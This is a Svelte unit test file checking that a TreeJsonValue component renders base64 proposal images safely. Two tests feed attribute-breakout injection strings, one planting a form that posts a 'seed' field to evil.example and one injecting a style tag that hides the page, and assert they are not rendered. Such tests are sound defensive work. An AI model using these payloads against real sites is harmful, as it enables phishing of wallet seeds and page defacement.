import TreeJsonValue from "$lib/components/common/TreeJsonValue.svelte";
import { render } from "@testing-library/svelte";

// A base64 encoded image comes from the proposal payload, for example the logo
// of a CreateServiceNervousSystem proposal. Both the key and the value are
// written by whoever submits the proposal.
describe("TreeJsonValue", () => {
  const renderBase64 = ({
    key,
    base64Encoding,
  }: {
    key: string;
    base64Encoding: string;
  }): HTMLElement => {
    const { container } = render(TreeJsonValue, {
      props: { valueType: "base64Encoding", key, data: { base64Encoding } },
    });
    return container;
  };

  it("should render the image", () => {
    const container = renderBase64({
      key: "logo",
      base64Encoding: "data:image/png;base64,iVBORw0KGgo=",
    });

    const image = container.querySelector("img");
    expect(image.getAttribute("src")).toBe(
      "data:image/png;base64,iVBORw0KGgo="
    );
    expect(image.getAttribute("alt")).toBe("logo");
    expect(image.getAttribute("loading")).toBe("lazy");
    expect(image.className).toContain("base64Encoding");
  });

  it("should not render markup injected through the value", () => {
    const container = renderBase64({
      key: "logo",
      base64Encoding:
        'x"><form action="https://evil.example/"><input name="seed"></form><img src="x',
    });

    expect(container.querySelectorAll("form").length).toBe(0);
    expect(container.querySelectorAll("input").length).toBe(0);
    expect(container.querySelectorAll("img").length).toBe(1);
  });

  it("should not render markup injected through the key", () => {
    const container = renderBase64({
      key: 'x"><style>body{display:none}</style><img alt="',
      base64Encoding: "data:image/png;base64,iVBORw0KGgo=",
    });

    expect(container.querySelectorAll("style").length).toBe(0);
    expect(container.querySelectorAll("img").length).toBe(1);
  });
});
